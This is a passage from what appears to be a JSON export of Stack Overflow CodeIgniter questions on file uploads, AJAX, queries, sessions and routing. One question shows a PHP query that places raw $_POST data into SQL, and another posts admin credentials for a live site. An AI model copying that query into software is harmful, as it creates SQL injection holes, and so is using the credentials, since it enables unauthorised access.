care\ndefine('FOPEN_WRITE_CREATE',                    'ab');\ndefine('FOPEN_READ_WRITE_CREATE',               'a+b');\ndefine('FOPEN_WRITE_CREATE_STRICT',             'xb');\ndefine('FOPEN_READ_WRITE_CREATE_STRICT',        'x+b');\n\n// Define Ajax Request\ndefine('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &amp;&amp; strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest');\n</code></pre>\n\n<p><strong>application/config/routes</strong></p>\n\n<pre><code>$route['upload'] = 'upload/upload';\n$route['upload/upload_img'] = 'upload/upload/upload_img';\n$route['upload/deleteImage'] = 'upload/upload/deleteImage';\n$route['upload/get_files'] = 'upload/upload/get_files'; \n</code></pre>\n\n<p><strong>application/modules/uplaod/controllers/upload</strong></p>\n\n<p>Exactly the same as <a href=\"https://github.com/blueimp/jQuery-File-Upload/wiki/jQuery-File-Upload-6.5-with-CodeIgniter-2.1\" rel=\"nofollow\">this controller</a>.\nThe only changes is in construct:</p>\n\n<pre><code> function __construct() {\n    parent::__construct();\n    $this-&gt;load-&gt;helper(array('form', 'url'));\n\n        //Set relative Path with CI Constant\n        $this-&gt;setPath_img_upload_folder(\"uploads/dress/img/\");\n        $this-&gt;setPath_img_thumb_upload_folder(\"uploads/dress/img/thumbnails/\");\n        //Delete img url\n        $this-&gt;setDelete_img_url(base_url() . '/upload/deleteImage/');\n        //Set url img with Base_url()\n        $this-&gt;setPath_url_img_upload_folder(base_url() . \"uploads/dress/img/\");\n        $this-&gt;setPath_url_img_thumb_upload_folder(base_url() . \"uploads/dress/img/thumbnails/\");\n\n  }\n  public function index() {\n  $this-&gt;load-&gt;view('upload_form');\n  }\n</code></pre>\n\n<p><strong>js/main.js</strong></p>\n\n<p>exactly the same as described in original post.</p>\n\n<p><strong>application/modules/upload/view/upload_form</strong></p>\n\n<pre><code>&lt;!DOCTYPE HTML&gt;\n&lt;!--\n/*\n * jQuery File Upload Plugin Demo 6.11\n * https://github.com/blueimp/jQuery-File-Upload\n *\n * Copyright 2010, Sebastian Tschan\n * https://blueimp.net\n *\n * Licensed under the MIT license:\n * http://www.opensource.org/licenses/MIT\n */\n--&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n&lt;!-- Force latest IE rendering engine or ChromeFrame if installed --&gt;\n&lt;!--[if IE]&gt;&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"&gt;&lt;![endif]--&gt;\n&lt;meta charset=\"utf-8\"&gt;\n&lt;title&gt;jQuery File Upload Demo&lt;/title&gt;\n&lt;meta name=\"description\" content=\"File Upload widget with multiple file selection, drag&amp;amp;drop support, progress bar and preview images for jQuery. Supports cross-domain, chunked and resumable file uploads. Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads.\"&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width\"&gt;\n&lt;!-- Bootstrap CSS Toolkit styles --&gt;\n&lt;link rel=\"stylesheet\" href=\"http://blueimp.github.com/cdn/css/bootstrap.min.css\"&gt;\n&lt;!-- Generic page styles --&gt;\n&lt;link rel=\"stylesheet\" href=\"/blueimp/css/style.css\"&gt;\n&lt;!-- Bootstrap styles for responsive website layout, supporting different screen sizes --&gt;\n&lt;link rel=\"stylesheet\" href=\"http://blueimp.github.com/cdn/css/bootstrap-responsive.min.css\"&gt;\n&lt;!-- Bootstrap CSS fixes for IE6 --&gt;\n&lt;!--[if lt IE 7]&gt;&lt;link rel=\"stylesheet\" href=\"http://blueimp.github.com/cdn/css/bootstrap-ie6.min.css\"&gt;&lt;![endif]--&gt;\n&lt;!-- Bootstrap Image Gallery styles --&gt;\n&lt;link rel=\"stylesheet\" href=\"http://blueimp.github.com/Bootstrap-Image-Gallery/css/bootstrap-image-gallery.min.css\"&gt;\n&lt;!-- CSS to style the file input field as button and adjust the Bootstrap progress bars --&gt;\n&lt;link rel=\"stylesheet\" href=\"/blueimp/css/jquery.fileupload-ui.css\"&gt;\n&lt;!-- CSS adjustments for browsers with JavaScript disabled --&gt;\n&lt;noscript&gt;&lt;link rel=\"stylesheet\" href=\"/blueimp/css/jquery.fileupload-ui-noscript.css\"&gt;&lt;/noscript&gt;\n&lt;!-- Shim to make HTML5 elements usable in older Internet Explorer versions --&gt;\n&lt;!--[if lt IE 9]&gt;&lt;script src=\"http://html5shim.googlecode.com/svn/trunk/html5.js\"&gt;&lt;/script&gt;&lt;![endif]--&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;div class=\"container\"&gt;\n\n    &lt;!-- The file upload form used as target for the file upload widget --&gt;\n    &lt;form id=\"fileupload\" action=\"upload/upload_img\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n        &lt;!-- Redirect browsers with JavaScript disabled to the origin page --&gt;\n        &lt;noscript&gt;&lt;input type=\"hidden\" name=\"redirect\" value=\"http://blueimp.github.com/jQuery-File-Upload/\"&gt;&lt;/noscript&gt;\n\n        &lt;!-- The fileupload-buttonbar contains buttons to add/delete files and start/cancel the upload --&gt;\n        &lt;div class=\"row fileupload-buttonbar\"&gt;\n            &lt;div class=\"span7\"&gt;\n                &lt;!-- The fileinput-button span is used to style the file input field as button --&gt;\n                &lt;span class=\"btn btn-success fileinput-button\"&gt;\n                    &lt;i class=\"icon-plus icon-white\"&gt;&lt;/i&gt;\n                    &lt;span&gt;Add files...&lt;/span&gt;\n                    &lt;input type=\"file\" name=\"userfile\" multiple&gt;\n                &lt;/span&gt;\n                &lt;button type=\"submit\" class=\"btn btn-primary start\"&gt;\n                    &lt;i class=\"icon-upload icon-white\"&gt;&lt;/i&gt;\n                    &lt;span&gt;Start upload&lt;/span&gt;\n                &lt;/button&gt;\n                &lt;button type=\"reset\" class=\"btn btn-warning cancel\"&gt;\n                    &lt;i class=\"icon-ban-circle icon-white\"&gt;&lt;/i&gt;\n                    &lt;span&gt;Cancel upload&lt;/span&gt;\n                &lt;/button&gt;\n                &lt;button type=\"button\" class=\"btn btn-danger delete\"&gt;\n                    &lt;i class=\"icon-trash icon-white\"&gt;&lt;/i&gt;\n                    &lt;span&gt;Delete&lt;/span&gt;\n                &lt;/button&gt;\n                &lt;input type=\"checkbox\" class=\"toggle\"&gt;\n            &lt;/div&gt;\n\n            &lt;!-- The global progress information --&gt;\n            &lt;div class=\"span5 fileupload-progress fade\"&gt;\n                &lt;!-- The global progress bar --&gt;\n                &lt;div class=\"progress progress-success progress-striped active\" role=\"progressbar\" aria-valuemin=\"0\" aria-valuemax=\"100\"&gt;\n                    &lt;div class=\"bar\" style=\"width:0%;\"&gt;&lt;/div&gt;\n                &lt;/div&gt;\n                &lt;!-- The extended global progress information --&gt;\n                &lt;div class=\"progress-extended\"&gt;&amp;nbsp;&lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n        &lt;!-- The loading indicator is shown during file processing --&gt;\n        &lt;div class=\"fileupload-loading\"&gt;&lt;/div&gt;\n        &lt;br&gt;\n        &lt;!-- The table listing the files available for upload/download --&gt;\n        &lt;table role=\"presentation\" class=\"table table-striped\"&gt;&lt;tbody class=\"files\" data-toggle=\"modal-gallery\" data-target=\"#modal-gallery\"&gt;&lt;/tbody&gt;&lt;/table&gt;\n    &lt;/form&gt;\n\n\n&lt;/div&gt;\n&lt;!-- modal-gallery is the modal dialog used for the image gallery --&gt;\n&lt;div id=\"modal-gallery\" class=\"modal modal-gallery hide fade\" data-filter=\":odd\" tabindex=\"-1\"&gt;\n    &lt;div class=\"modal-header\"&gt;\n        &lt;a class=\"close\" data-dismiss=\"modal\"&gt;&amp;times;&lt;/a&gt;\n        &lt;h3 class=\"modal-title\"&gt;&lt;/h3&gt;\n    &lt;/div&gt;\n    &lt;div class=\"modal-body\"&gt;&lt;div class=\"modal-image\"&gt;&lt;/div&gt;&lt;/div&gt;\n    &lt;div class=\"modal-footer\"&gt;\n        &lt;a class=\"btn modal-download\" target=\"_blank\"&gt;\n            &lt;i class=\"icon-download\"&gt;&lt;/i&gt;\n            &lt;span&gt;Download&lt;/span&gt;\n        &lt;/a&gt;\n        &lt;a class=\"btn btn-success modal-play modal-slideshow\" data-slideshow=\"5000\"&gt;\n            &lt;i class=\"icon-play icon-white\"&gt;&lt;/i&gt;\n            &lt;span&gt;Slideshow&lt;/span&gt;\n        &lt;/a&gt;\n        &lt;a class=\"btn btn-info modal-prev\"&gt;\n            &lt;i class=\"icon-arrow-left icon-white\"&gt;&lt;/i&gt;\n            &lt;span&gt;Previous&lt;/span&gt;\n        &lt;/a&gt;\n        &lt;a class=\"btn btn-primary modal-next\"&gt;\n            &lt;span&gt;Next&lt;/span&gt;\n            &lt;i class=\"icon-arrow-right icon-white\"&gt;&lt;/i&gt;\n        &lt;/a&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n&lt;!-- The template to display files available for upload --&gt;\n&lt;script id=\"template-upload\" type=\"text/x-tmpl\"&gt;\n{% for (var i=0, file; file=o.files[i]; i++) { %}\n    &lt;tr class=\"template-upload fade\"&gt;\n        &lt;td class=\"preview\"&gt;&lt;span class=\"fade\"&gt;&lt;/span&gt;&lt;/td&gt;\n        &lt;td class=\"name\"&gt;&lt;span&gt;{%=file.name%}&lt;/span&gt;&lt;/td&gt;\n        &lt;td class=\"size\"&gt;&lt;span&gt;{%=o.formatFileSize(file.size)%}&lt;/span&gt;&lt;/td&gt;\n        {% if (file.error) { %}\n            &lt;td class=\"error\" colspan=\"2\"&gt;&lt;span class=\"label label-important\"&gt;Error&lt;/span&gt; {%=file.error%}&lt;/td&gt;\n        {% } else if (o.files.valid &amp;&amp; !i) { %}\n            &lt;td&gt;\n                &lt;div class=\"progress progress-success progress-striped active\" role=\"progressbar\" aria-valuemin=\"0\" aria-valuemax=\"100\" aria-valuenow=\"0\"&gt;&lt;div class=\"bar\" style=\"width:0%;\"&gt;&lt;/div&gt;&lt;/div&gt;\n            &lt;/td&gt;\n            &lt;td class=\"start\"&gt;{% if (!o.options.autoUpload) { %}\n                &lt;button class=\"btn btn-primary\"&gt;\n                    &lt;i class=\"icon-upload icon-white\"&gt;&lt;/i&gt;\n                    &lt;span&gt;Start&lt;/span&gt;\n                &lt;/button&gt;\n            {% } %}&lt;/td&gt;\n        {% } else { %}\n            &lt;td colspan=\"2\"&gt;&lt;/td&gt;\n        {% } %}\n        &lt;td class=\"cancel\"&gt;{% if (!i) { %}\n            &lt;button class=\"btn btn-warning\"&gt;\n                &lt;i class=\"icon-ban-circle icon-white\"&gt;&lt;/i&gt;\n                &lt;span&gt;Cancel&lt;/span&gt;\n            &lt;/button&gt;\n        {% } %}&lt;/td&gt;\n    &lt;/tr&gt;\n{% } %}\n&lt;/script&gt;\n&lt;!-- The template to display files available for download --&gt;\n&lt;script id=\"template-download\" type=\"text/x-tmpl\"&gt;\n{% for (var i=0, file; file=o.files[i]; i++) { %}\n    &lt;tr class=\"template-download fade\"&gt;\n        {% if (file.error) { %}\n            &lt;td&gt;&lt;/td&gt;\n            &lt;td class=\"name\"&gt;&lt;span&gt;{%=file.name%}&lt;/span&gt;&lt;/td&gt;\n            &lt;td class=\"size\"&gt;&lt;span&gt;{%=o.formatFileSize(file.size)%}&lt;/span&gt;&lt;/td&gt;\n            &lt;td class=\"error\" colspan=\"2\"&gt;&lt;span class=\"label label-important\"&gt;Error&lt;/span&gt; {%=file.error%}&lt;/td&gt;\n        {% } else { %}\n            &lt;td class=\"preview\"&gt;{% if (file.thumbnail_url) { %}\n                &lt;a href=\"{%=file.url%}\" title=\"{%=file.name%}\" rel=\"gallery\" download=\"{%=file.name%}\"&gt;&lt;img src=\"{%=file.thumbnail_url%}\"&gt;&lt;/a&gt;\n            {% } %}&lt;/td&gt;\n            &lt;td class=\"name\"&gt;\n                &lt;a href=\"{%=file.url%}\" title=\"{%=file.name%}\" rel=\"{%=file.thumbnail_url&amp;&amp;'gallery'%}\" download=\"{%=file.name%}\"&gt;{%=file.name%}&lt;/a&gt;\n            &lt;/td&gt;\n            &lt;td class=\"size\"&gt;&lt;span&gt;{%=o.formatFileSize(file.size)%}&lt;/span&gt;&lt;/td&gt;\n            &lt;td colspan=\"2\"&gt;&lt;/td&gt;\n        {% } %}\n        &lt;td class=\"delete\"&gt;\n            &lt;button class=\"btn btn-danger\" data-type=\"{%=file.delete_type%}\" data-url=\"{%=file.delete_url%}\"{% if (file.delete_with_credentials) { %} data-xhr-fields='{\"withCredentials\":true}'{% } %}&gt;\n                &lt;i class=\"icon-trash icon-white\"&gt;&lt;/i&gt;\n                &lt;span&gt;Delete&lt;/span&gt;\n            &lt;/button&gt;\n            &lt;input type=\"checkbox\" name=\"delete\" value=\"1\"&gt;\n        &lt;/td&gt;\n    &lt;/tr&gt;\n{% } %}\n&lt;/script&gt;\n&lt;script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.js\"&gt;&lt;/script&gt;\n&lt;!-- The jQuery UI widget factory, can be omitted if jQuery UI is already included --&gt;\n&lt;script src=\"/blueimp/js/vendor/jquery.ui.widget.js\"&gt;&lt;/script&gt;\n&lt;!-- The Templates plugin is included to render the upload/download listings --&gt;\n&lt;script src=\"http://blueimp.github.com/JavaScript-Templates/tmpl.min.js\"&gt;&lt;/script&gt;\n&lt;!-- The Load Image plugin is included for the preview images and image resizing functionality --&gt;\n&lt;script src=\"http://blueimp.github.com/JavaScript-Load-Image/load-image.min.js\"&gt;&lt;/script&gt;\n&lt;!-- The Canvas to Blob plugin is included for image resizing functionality --&gt;\n&lt;script src=\"http://blueimp.github.com/JavaScript-Canvas-to-Blob/canvas-to-blob.min.js\"&gt;&lt;/script&gt;\n&lt;!-- Bootstrap JS and Bootstrap Image Gallery are not required, but included for the demo --&gt;\n&lt;script src=\"http://blueimp.github.com/cdn/js/bootstrap.min.js\"&gt;&lt;/script&gt;\n&lt;script src=\"http://blueimp.github.com/Bootstrap-Image-Gallery/js/bootstrap-image-gallery.min.js\"&gt;&lt;/script&gt;\n&lt;!-- The Iframe Transport is required for browsers without support for XHR file uploads --&gt;\n&lt;script src=\"/blueimp/js/jquery.iframe-transport.js\"&gt;&lt;/script&gt;\n&lt;!-- The basic File Upload plugin --&gt;\n&lt;script src=\"/blueimp/js/jquery.fileupload.js\"&gt;&lt;/script&gt;\n&lt;!-- The File Upload file processing plugin --&gt;\n&lt;script src=\"/blueimp/js/jquery.fileupload-fp.js\"&gt;&lt;/script&gt;\n&lt;!-- The File Upload user interface plugin --&gt;\n&lt;script src=\"/blueimp/js/jquery.fileupload-ui.js\"&gt;&lt;/script&gt;\n&lt;!-- The main application script --&gt;\n&lt;script src=\"/blueimp/js/main.js\"&gt;&lt;/script&gt;\n&lt;!-- The XDomainRequest Transport is included for cross-domain file deletion for IE8+ --&gt;\n&lt;!--[if gte IE 8]&gt;&lt;script src=\"js/cors/jquery.xdr-transport.js\"&gt;&lt;/script&gt;&lt;![endif]--&gt;\n&lt;/body&gt; \n&lt;/html&gt;\n</code></pre>\n\n<p>all links (js and css) are working, I have checked twice.</p>\n\n<p><strong>.htaccess</strong></p>\n\n<p>maybe the problem is here, cause using the \"jquery-file-upload.appspot.com\" into form's action, the script working.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\n    Options +FollowSymLinks -Indexes\n    RewriteEngine on\n\n    # NOTICE: If you get a 404 play with combinations of the following commented out lines\n    #AllowOverride All\n    #RewriteBase /\n\n    # Restrict your site to only one domain\n    #RewriteCond %{HTTP_HOST} !^www\\.\n    #RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n\n    &lt;IfModule mod_php5.c&gt;\n        RewriteRule ^(.*)$ index.php/$1 [L]\n    &lt;/IfModule&gt;\n\n    &lt;IfModule !mod_php5.c&gt;\n        RewriteRule ^(.*)$ index.php?/$1 [L]\n    &lt;/IfModule&gt;\n\n&lt;/IfModule&gt;\n\n#prevent access to htaccess file\n&lt;Files .htaccess&gt;\n order allow,deny\n deny from all\n\n&lt;/Files&gt;\n\n#disable directory browsing\nOptions All -Indexes\nIndexIgnore *\n</code></pre>\n"},{"tags":["mysql","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":29,"score":-4,"question_id":13218210,"title":"Get facebook or other social sites information","body":"<p>For my project requernment I need the facebook users information by using facebook api on CODEIGNITER some one please help me for that.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13216820,"title":"How to retrieve the date into three dropdown list?","body":"<p>I have a birthdate field which is optional after inserting a record into clients table.</p>\n\n<p>the default value will is \"000-00-00\" after insert.</p>\n\n<p>Now, I want to edit the record in the table and would like to get the value of the birth_date field into three dropdown list.</p>\n\n<p>The three dropdown list are Day, Month, and Year.</p>\n\n<p>If there is no birthdate the selected value of the three dropdown should be \"Day\", \"Month\", and \"Year\".</p>\n\n<p>I tried the following code and don't know if this is the best way.</p>\n\n<pre><code>$dateValue = '0000-00-00';\n$year = explode(\"-\", $dateValue);\n\nif ($year[0] == \"0000\") {\n    $selected_year = \"Year\";\n            $selected_month = \"Month\";\n            $selected_day = \"Day\";\n}else{\n    $selected_year = date(\"Y\",strtotime($user['birth_date']));\n}\n</code></pre>\n\n<p>If there is a better way for this, please let me know.</p>\n\n<p>btw, I'm using codeigniter.</p>\n"},{"tags":["php","codeigniter","activerecord","foreach","mysqli"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13204125,"title":"DISTINCT mysql query within a foreach loop","body":"<p>I need to query a database and return distinct values for columns. The query is in a foreach loop and varies based on an array.</p>\n\n<pre><code>$get_all_col_names = $this-&gt;db-&gt;list_fields($table_by_product);\n//This will return \"X_SIZE\", \"X_PRINT\", \"X_QTY\"\n</code></pre>\n\n<p>Now I have a foreach which needs to get the distinct values of \"X_SIZE\", \"X_PRINT\", and \"X_QTY\" respectively. </p>\n\n<pre><code>foreach ($X_types as $X) {\n   $this-&gt;db-&gt;select($X);\n   $this-&gt;db-&gt;distinct();\n   $qX = $this-&gt;db-&gt;get($table_by_product);\n   return $qX-&gt;result_object();\n}\n</code></pre>\n\n<p>The problem with this current setup is that it is only returning DISTINCT values for X_QTY which is the LAST array in the list.</p>\n\n<p>I need distinct values returned for ALL keys in the array. How can I make this work? Thanks for the help.</p>\n"},{"tags":["php","codeigniter","frameworks","smarty"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":41,"score":0,"question_id":12975786,"title":"CodeIgniter benchmarking with Smarty","body":"<p>I've connected Smarty to CodeIgniter and now of course i cant use {memory_used} and {elapsed_time}, but i want to know how i can output this information to my webpage now?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13212445,"title":"CodeIgniter accesing CI super object in core class constructor","body":"<p>I have core class in application/core/MY_Lang.php, this class extends CI_Lang class, and overrides contructor of base class:</p>\n\n<pre><code>class MY_Lang extends CI_Lang {\n    function __construct()\n    {\n        parent::__construct();\n    }\n}\n</code></pre>\n\n<p>How i can access to the database object from constructor of my class.</p>\n\n<p>I tried to access CI super object, but class CI_Controller is not loaded for now</p>\n\n<pre><code>    if (class_exists('CI_Controller'))\n    {\n        $this-&gt;CI =&amp; get_instance();\n    }\n</code></pre>\n"},{"tags":["jquery","mysql","ajax","codeigniter","laravel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13203711,"title":"Implementing non framework code into a framework such as laravel or codeigniter","body":"<p>I'm trying to implement <strong>AJAX Booking Calendar Pro</strong> into my Laravel application. <em>(It was purchased from CodeCanyon)</em> I've implemented most of the plugin, I just need to figure out how to connect it to the database so I can save and display the information. I'm using the controller approach. The start of the js file looks like this..</p>\n\n<pre><code>(function($)\n{\n    $.fn.DOPBookingCalendar = function(options)\n    {\n        var Data = {'Type':'BackEnd',\n                'DataURL':'/php/load.php',\n                'SaveURL':'/php/save.php',\n                'DayNames':['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'],\n                'MonthNames':['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'],\n                'AvailableText':'AVAILABLE', // The available text.\n                'BookedText':'BOOKED', // The Booked text.\n                'UnavailableText':'NOT AVAILABLE', // The unavailable text.\n                'DateType':1, // 1: american style; 2: european style;\n                'PopupDisplayTime':300, // The time for the Pop-Up to Show/Hide\n                'StatusLabel':'Status', // The text for Availability label.\n                'PriceLabel':'Price', // The text for Price label.\n                'Currency':'$', // The currency.\n                'SubmitBtnText':'Submit', // The text for Submit button.\n                'ResetBtnText':'Reset', // The text for Reset button.\n                'ExitBtnText':'Exit', // The text for Exit button.\n                'InvalidPriceText':'Error! Please enter a number for the price.' // The text for Invalid Price Warning.\n               },\n</code></pre>\n\n<p>It seems to me that I it could be something as simple as setting the DataURL and SaveURL to a controller/model ... but how would I connect the database, and how do I know what fields the table would have? Hopefully someone will have experience with this.</p>\n\n<pre><code>//This is the save query\n\nif (isset($_POST['dop_booking_calendar'])){\n    require_once 'opendb.php';\n    mysql_query('UPDATE schedule SET data=\"'.$_POST['dop_booking_calendar'].'\" WHERE id=1');\n}\n\n//this is the load query\n\nrequire_once 'opendb.php';\n\n$query = mysql_query('SELECT * FROM schedule WHERE id=1');\n\nwhile ($result=mysql_fetch_array($query)){\n    echo $result['data'];\n}\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":5,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":6151,"score":1,"question_id":4197976,"title":"CodeIgniter Disallowed Key Characters","body":"<p>CodeIgniter is giving me a <code>Disallowed Key Characters</code> error. I've narrowed it down to the name attribute of a form field: <code>name='prod[50-4121.5]'</code> but I'm not sure what to do about it.</p>\n"},{"tags":["php","jquery","ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":13212882,"title":"How to return PHP variables on success AJAX/jQuery POST","body":"<p>How do I use AJAX to return a variable in PHP? I am currently using echo in my controller to display a price on <code>dropdown .change</code> in a <code>div</code> called price.</p>\n\n<p>However I have a hidden field which I need to return the row id to on change. How do I assign the return var in jQuery so that I can echo it in my hidden field?</p>\n\n<h1>jQuery</h1>\n\n<pre><code>$(document).ready(function() {\n    $('#pricingEngine').change(function() {\n         var query = $(\"#pricingEngine\").serialize();\n         $('#price').fadeOut(500).addClass('ajax-loading');\n         $.ajax({\n             type: \"POST\",\n             url: \"store/PricingEngine\",\n             data: query,\n             success: function(data)\n             {\n                  $('#price').removeClass('ajax-loading').html('$' + data).fadeIn(500);\n             }\n         });\n    return false;\n   });\n\n});\n</code></pre>\n\n<h1>Controller</h1>\n\n<pre><code>function PricingEngine()\n{\n    //print_r($_POST);\n    $this-&gt;load-&gt;model('M_Pricing');\n    $post_options = array(\n      'X_SIZE' =&gt; $this-&gt;input-&gt;post('X_SIZE'),\n      'X_PAPER' =&gt; $this-&gt;input-&gt;post('X_PAPER'),\n      'X_COLOR' =&gt; $this-&gt;input-&gt;post('X_COLOR'),\n      'X_QTY' =&gt; $this-&gt;input-&gt;post('X_QTY'),\n      'O_RC' =&gt; $this-&gt;input-&gt;post('O_RC')\n                          );\n\n    $data = $this-&gt;M_Pricing-&gt;ajax_price_engine($post_options);\n\n    foreach($data as $pData) {\n        echo number_format($pData-&gt;F_PRICE / 1000,2);\n        return $ProductById = $pData-&gt;businesscards_id;\n    }\n}\n</code></pre>\n\n<h1>View</h1>\n\n<p>Here is my hidden field I want to pass the VAR to every-time the form is changed.\n\" /></p>\n\n<p>Thanks for the help! </p>\n"},{"tags":["php","apache","codeigniter","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13205053,"title":"redirect HTTP POST apache,","body":"<p>I have a problem where I want to get the parameter HTTP POST from another server, I want to communicate from server A to server B via HTTP POST, in this problem server A is using default software to POST to server B,. but server B cannot get request HTTP POST from server A, if I look at the access.log</p>\n\n<pre><code>\"POST http://mywebsite/class/param\" 404\n</code></pre>\n\n<p>that's mean, request from server A not recognized, 404 page not found,. I then simulate using html form uses method POST to get a correct log, if I look access.log again,</p>\n\n<pre><code>\"POST /class/param\" 200\n</code></pre>\n\n<p>200 mean OK, request acceptable,. </p>\n\n<p>My question is how to redirect POST </p>\n\n<pre><code>http://mywebsite/class/param\n</code></pre>\n\n<p>to </p>\n\n<pre><code>/class/param\n</code></pre>\n\n<p>?? I've tried to searching, seemed to be able to use mod_rewrite, but I still can not use it.</p>\n\n<p>spec:<br>\nserver web : apache<br>\nweb language: php<br>\nphp framework : codeigniter<br></p>\n"},{"tags":["php","codeigniter","rest","backbone.js"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":455,"score":1,"question_id":10237539,"title":"Handing data from Backbone to CodeIgniter","body":"<p>I'm having issues handing data from Backbone to a CodeIgniter application... After calling Backbone's <code>save()</code> or <code>sync()</code> methods and inspecting the request headers in Chrome Tools, it appears that Backbone sends data to the server using a Request Payload and not the standard Form Data approach that jQuery, and standard HTML forms submit with.</p>\n\n<p>If I enable <code>Backbone.emulateJSON()</code>, the post is sent via Form Data and I'm able to retrieve the data in <code>$this-&gt;input-&gt;post('model')</code> as expected. I can then call <code>json_decode()</code> on that data and be on-my-way – However, this will break my implementation of CodeIgniter's Validation library. I store my validation rules in separate files and behind the scenes they expect data to reside in <code>$this-&gt;input-&gt;post()</code>, not <code>$this-&gt;input-&gt;post('model')</code>;</p>\n\n<p>I have looked into using Phil Sturgeon's Restserver library. It appears that it will allow me to remove <code>Backbone.emulateHTTP()</code> by handling <code>PUT</code> and <code>DELETE</code> requests. However, I would still be required to call <code>$this-&gt;post('model')</code>, validation would still be broken, and in fact, validation isn't even supported for the <code>PUT</code> and <code>DELETE</code> requests with this library!</p>\n\n<p>I'm beginning to think CodeIgniter's had the biscuit and will not support my needy front-end requirements. I've been sticking with CodeIgniter because I'm used to it's architecture by this point and Datamapper ORM is so wonderful.</p>\n\n<p>Suggestions on how to proceed? I'm open to entire backend framework swapping if your suggestion comes with an elegant RESTful implementation that works with Backbone by default, has a strong ORM, and extensive validation / XSS libraries. Or if you can solve my CodeIgniter dilemma, that works too.</p>\n"},{"tags":["php","codeigniter","session"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13206609,"title":"Unable to load the requested class: session","body":"<p>my config file looks like this-></p>\n\n<pre><code>$config['sess_cookie_name']     = 'ci_session';\n$config['sess_expiration']      = 7200;\n$config['sess_expire_on_close'] = TRUE;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = FALSE;\n$config['sess_table_name']      = 'ci_sessions';\n$config['sess_match_ip']        = FALSE;\n$config['sess_match_useragent'] = TRUE;\n$config['sess_time_to_update']  = 300;\n</code></pre>\n\n<p>autoload is -></p>\n\n<pre><code>$autoload['libraries'] = array('database','session','uri');\n</code></pre>\n\n<p>I am getting the error:  </p>\n\n<pre><code>Unable to load the requested class: session\n</code></pre>\n\n<p>Please tell me what the actual problem is. I have searched all the previous questions concerned  about this but was not able to fix the problem yet. Thanks in advance .</p>\n"},{"tags":["php","javascript","codeigniter","richtexteditor"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":33,"score":-2,"question_id":13206494,"title":"Redactor (WYSIWYG) textarea \"lag\" - not posting latest data","body":"<p>i've got a problem while creating a webiste.\nI'm using codeigniter framework and <a href=\"http://imperavi.com/redactor/\" rel=\"nofollow\">Redactor</a> rich text editor.\nPlease login to 109.235.69.39/ci/ - main page (details: adm, 123456) and go to 109.235.69.39/ci/admin/prizes/edit/34/2 - prize attaching page. Edit something and submit, you can see that only rare times content updates. </p>\n\n<pre><code>&lt;textarea name=\"description\" id=\"textarea\"&gt;&lt;?=$_POST['description'];?&gt;&lt;/textarea&gt;&lt;br /&gt;\n</code></pre>\n\n<p>When you edit something, then click on \"HTML CODE\" button and then submit, it updates. Dunno why, just <code>$_POST['description']</code> many times returns nothing.</p>\n\n<p>Can anyone help me ? \nThanks.</p>\n"},{"tags":["php","jquery","ajax","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13209562,"title":"AJAX with Codeigniter - Form Post jQuery on change","body":"<pre><code>&lt;script src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;\n $(document).ready(function() {\n      $(\"#pricingEngine\").change(function() {\n         $.post(\"pricingEngine.php\", $.(\"#pricingEngine\").serialize(), function(data) {\n            $(\"#result\").html(data);\n         });\n         return false;\n      });\n});\n&lt;/script&gt;\n</code></pre>\n\n<p><strong>Console is showing me the following error \"Uncaught SyntaxError: Unexpected token (\"</strong> The POST is not working. Can someone help me with this please? Thanks!</p>\n"},{"tags":["php","codeigniter","codeigniter-routing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13206604,"title":"Avoid automatic PHP routing in a MVC","body":"<p>I am using a <strong>MVC</strong> and on my application file, I am routing this way :</p>\n\n<pre><code># Routing\n$routing = array(\n    '([a-zA-Z]+)\\/?'    =&gt;  array('Post', 'view')\n);\nframework::routing($routing);\n</code></pre>\n\n<p>It means that all 